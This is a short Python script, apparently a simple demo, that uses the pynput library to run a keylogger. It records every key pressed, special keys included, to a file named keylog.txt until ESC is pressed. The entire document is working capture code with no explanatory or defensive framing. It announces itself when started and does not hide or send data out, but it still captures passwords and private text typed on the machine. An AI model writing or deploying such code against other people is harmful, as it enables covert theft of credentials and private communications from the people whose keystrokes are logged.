from pynput import keyboard

# File to save the logged keystrokes
LOG_FILE = "keylog.txt"

def on_press(key):
    """
    Callback function that gets called when a key is pressed.
    
    :param key: The key that was pressed.
    """
    try:
        with open(LOG_FILE, "a") as log_file:
            # Log the key pressed
            log_file.write(f"{key.char}")
    except AttributeError:
        # Special keys (like shift, ctrl, etc.)
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{key}]")

def on_release(key):
    """
    Callback function that gets called when a key is released.
    
    :param key: The key that was released.
    """
    if key == keyboard.Key.esc:
        # Stop the listener when 'esc' key is pressed
        return False

def main():
    """
    Main function to start the keylogger.
    """
    print("Keylogger started. Press ESC to stop.")
    
    # Create a listener to monitor keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
